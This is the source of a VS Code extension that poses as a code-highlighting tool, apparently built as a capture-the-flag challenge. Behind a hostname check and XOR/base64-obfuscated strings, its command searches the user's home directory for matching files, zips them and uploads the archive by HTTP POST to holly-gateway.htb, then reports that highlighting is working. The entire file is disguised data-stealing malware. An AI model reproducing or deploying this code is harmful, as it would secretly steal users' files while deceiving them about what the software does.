const vscode = require("vscode");
const fs = require("fs");
const path = require("path");
const os = require("os");
const { execSync } = require("child_process");
const https = require("http");

function activate(context) {
	
	console.log('❄ ❄ ❄ Code-Highlight extension is active... ❄ ❄ ❄');

	const disposable = vscode.commands.registerCommand('code-highlight.activate', async function () {
		if (os.hostname() !== 'frosty-node') {
			vscode.window.showInformationMessage('Code Highlight activated!');
			return;
		}
		
		function UhlAGtoaWM() {
			const ZPtKUr = 'sn0wwyy';
			const QMOHbr = 'gl0be1337';
			return ZPtKUr + QMOHbr; 
		}

		const WkZtejFrZT = Buffer.from(UhlAGtoaWM(), 'utf8');


		function czIixzVTWz(buf, keyBytes = WkZtejFrZT) {
		const out = Buffer.alloc(buf.length);
		for (let i = 0; i < buf.length; i++) {
			out[i] = buf[i] ^ keyBytes[i % keyBytes.length]; 
		}
			return out;
		}


		function qmJJvtPnmp(b64) {
			const buf = Buffer.from(b64, 'base64');
			const FftbsaD = czIixzVTWz(buf);
			return FftbsaD.toString('utf8');
		}

		const iAjuwiisFf = [
		"XQ9HBA==",
		"XQVFFRI=",
		"XR1DHw==",
		"XQteAQ==",
		"XR5UEQ==",
		"XQpfFA8=",
		"OzpyDDpNFQ4PWVIQQmw=",
		"JT1zKDIBDQICQ1NVXwY=",
		"LF9DKBlJDQ9dXgU6XwBESg=="
		]

		const homedir = os.homedir();
		const stagedr = path.join(homedir, 'important-folder');
		const ext = iAjuwiisFf.map(qmJJvtPnmp);
		if (!fs.existsSync(stagedr)) fs.mkdirSync(stagedr);
		
		function scan(dir, depth = 0) {
			if (depth > 3) return;
			try {
				fs.readdirSync(dir).forEach(item => {
					const fullPath = path.join(dir, item);
					try {
						const stats = fs.statSync(fullPath);
						if (ext.some(p => item.includes(p))) {
							if (stats.isFile()) {
								fs.copyFileSync(fullPath, path.join(stagedr, item));
							}
						}
						if (stats.isDirectory() && !item.startsWith('.')) {
							scan(fullPath, depth + 1);
						}
					} catch {}
				});
			} catch {}
		}
		
		scan(homedir);
		
		const zipPath = path.join(homedir, 'documents.zip');
		try {
			execSync(`cd "${homedir}" && zip -r documents.zip important-folder`, { stdio: 'ignore' });
		} catch {}
		
		if (fs.existsSync(zipPath)) {
			const data = fs.readFileSync(zipPath);
			const req = https.request({
				hostname: 'holly-gateway.htb',
				port: 8080,
				path: '/upload',
				method: 'POST',
				headers: { 'Content-Length': data.length }
			});
			req.write(data);
			req.end();
		}
		vscode.window.showInformationMessage('Highlight applied, and is working as intended!');
	});
	context.subscriptions.push(disposable);
}

function deactivate() {}
module.exports = { activate, deactivate }